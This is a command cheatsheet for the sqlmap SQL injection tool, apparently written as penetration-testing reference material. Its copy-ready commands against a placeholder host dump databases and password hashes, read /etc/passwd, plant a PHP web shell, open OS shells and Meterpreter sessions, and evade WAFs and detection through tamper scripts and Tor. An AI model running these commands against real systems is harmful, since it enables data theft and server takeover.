# sqlmap Cheatsheet

## Basic Usage
```bash
# Test a URL parameter
sqlmap -u "http://target.com/page?id=1"

# Test POST data
sqlmap -u "http://target.com/login" --data="user=admin&pass=test"

# Test with cookie authentication
sqlmap -u "http://target.com/page?id=1" --cookie="session=abc123"

# Test a specific parameter
sqlmap -u "http://target.com/page?id=1&name=test" -p id

# Use a saved request from Burp (recommended)
sqlmap -r request.txt

# Test with custom headers
sqlmap -u "http://target.com/api/user" --headers="Authorization: Bearer token\nX-Custom: value"
```

## Detection and Enumeration
```bash
# Enumerate databases
sqlmap -u "http://target.com/page?id=1" --dbs

# Enumerate tables in a database
sqlmap -u "http://target.com/page?id=1" -D dbname --tables

# Enumerate columns in a table
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --columns

# Dump table data
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump

# Dump specific columns
sqlmap -u "http://target.com/page?id=1" -D dbname -T users -C username,password --dump

# Dump all databases (aggressive)
sqlmap -u "http://target.com/page?id=1" --dump-all

# Get current user
sqlmap -u "http://target.com/page?id=1" --current-user

# Get current database
sqlmap -u "http://target.com/page?id=1" --current-db

# Check if current user is DBA
sqlmap -u "http://target.com/page?id=1" --is-dba

# List database users and passwords
sqlmap -u "http://target.com/page?id=1" --users --passwords
```

## Injection Techniques
```bash
# Specify technique (default: all)
sqlmap -u "http://target.com/page?id=1" --technique=BEUSTQ
# B = Boolean-based blind
# E = Error-based
# U = UNION query-based
# S = Stacked queries
# T = Time-based blind
# Q = Inline queries

# Force specific DBMS
sqlmap -u "http://target.com/page?id=1" --dbms=mysql
# Options: mysql, mssql, oracle, postgresql, sqlite, access

# Set injection payload prefix/suffix
sqlmap -u "http://target.com/page?id=1" --prefix="')" --suffix="-- -"

# Set UNION columns
sqlmap -u "http://target.com/page?id=1" --union-cols=5

# Second-order injection
sqlmap -u "http://target.com/page?id=1" --second-url="http://target.com/result"
```

## Tamper Scripts
```bash
# Use tamper scripts (bypass WAF/filters)
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment

# Common tamper scripts
--tamper=apostrophemask          # Replace ' with UTF-8 fullwidth
--tamper=base64encode            # Base64 encode payload
--tamper=between                 # Replace > with NOT BETWEEN 0 AND
--tamper=charencode              # URL-encode all characters
--tamper=charunicodeencode       # Unicode URL-encode
--tamper=equaltolike             # Replace = with LIKE
--tamper=greatest                # Replace > with GREATEST
--tamper=ifnull2ifisnull         # Replace IFNULL with IF(ISNULL())
--tamper=modsecurityversioned    # Versioned MySQL comment bypass
--tamper=modsecurityzeroversioned # Zero-versioned comment bypass
--tamper=randomcase              # Random case for keywords
--tamper=randomcomments          # Add random inline comments
--tamper=space2comment           # Replace space with /**/
--tamper=space2dash              # Replace space with -- \n
--tamper=space2hash              # Replace space with # \n (MySQL)
--tamper=space2mssqlblank        # Replace space with MSSQL blank chars
--tamper=space2plus              # Replace space with +
--tamper=space2randomblank       # Replace space with random blank
--tamper=unionalltounion         # Replace UNION ALL with UNION
--tamper=uppercase               # Uppercase all keywords

# Chain multiple tamper scripts
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,randomcase,between
```

## Authentication and Session
```bash
# Cookie-based auth
sqlmap -u "http://target.com/page?id=1" --cookie="PHPSESSID=abc123"

# HTTP Basic auth
sqlmap -u "http://target.com/page?id=1" --auth-type=basic --auth-cred="user:pass"

# HTTP Digest auth
sqlmap -u "http://target.com/page?id=1" --auth-type=digest --auth-cred="user:pass"

# Custom header auth
sqlmap -u "http://target.com/api?id=1" -H "Authorization: Bearer <token>"

# Use proxy (Burp)
sqlmap -u "http://target.com/page?id=1" --proxy="http://127.0.0.1:8080"

# Use Tor
sqlmap -u "http://target.com/page?id=1" --tor --tor-type=SOCKS5 --check-tor
```

## Advanced Options
```bash
# OS shell (if stacked queries + DBA)
sqlmap -u "http://target.com/page?id=1" --os-shell

# SQL shell
sqlmap -u "http://target.com/page?id=1" --sql-shell

# Execute specific SQL
sqlmap -u "http://target.com/page?id=1" --sql-query="SELECT version()"

# Read a file from server
sqlmap -u "http://target.com/page?id=1" --file-read="/etc/passwd"

# Write a file to server
sqlmap -u "http://target.com/page?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# Attempt to get a Meterpreter session
sqlmap -u "http://target.com/page?id=1" --os-pwn
```

## Performance and Stealth
```bash
# Set number of threads
sqlmap -u "http://target.com/page?id=1" --threads=10

# Set delay between requests (seconds)
sqlmap -u "http://target.com/page?id=1" --delay=1

# Set request timeout
sqlmap -u "http://target.com/page?id=1" --timeout=30

# Random User-Agent
sqlmap -u "http://target.com/page?id=1" --random-agent

# Set specific User-Agent
sqlmap -u "http://target.com/page?id=1" --user-agent="Mozilla/5.0 ..."

# Safe URL (visit between injections to maintain session)
sqlmap -u "http://target.com/page?id=1" --safe-url="http://target.com/home" --safe-freq=3

# Set risk level (1-3, higher = more aggressive payloads)
sqlmap -u "http://target.com/page?id=1" --risk=3

# Set detection level (1-5, higher = more tests)
sqlmap -u "http://target.com/page?id=1" --level=5

# Batch mode (auto-answer prompts)
sqlmap -u "http://target.com/page?id=1" --batch

# Verbose output
sqlmap -u "http://target.com/page?id=1" -v 3
```

## Testing Specific Injection Points
```bash
# Test JSON body
sqlmap -u "http://target.com/api" --data='{"id": 1}' --headers="Content-Type: application/json"

# Test in HTTP header
sqlmap -u "http://target.com/page" --headers="X-Forwarded-For: 1*"  # * marks injection point

# Test in cookie value
sqlmap -u "http://target.com/page" --cookie="id=1*"  # * marks injection point

# Test REST-style URL parameter
sqlmap -u "http://target.com/api/users/1*/profile"  # * marks injection point

# Test SOAP/XML body
sqlmap -r soap_request.txt --param-del=";"
```

## Common Full Commands
```bash
# Standard pentest scan
sqlmap -r request.txt --batch --dbs --risk=2 --level=3 --threads=5

# WAF bypass scan
sqlmap -r request.txt --batch --tamper=space2comment,randomcase --random-agent --delay=2

# Full database dump
sqlmap -r request.txt --batch -D targetdb --dump --threads=10

# Quick check if vulnerable
sqlmap -u "http://target.com/page?id=1" --batch --banner
```

## Output and Logging
```bash
# Save output to directory
sqlmap -u "http://target.com/page?id=1" --output-dir=/path/to/output

# CSV output for dump
sqlmap -u "http://target.com/page?id=1" -D db -T users --dump --csv-del=","

# Flush previous session
sqlmap -u "http://target.com/page?id=1" --flush-session

# Resume from saved session
sqlmap -u "http://target.com/page?id=1" --resume
```
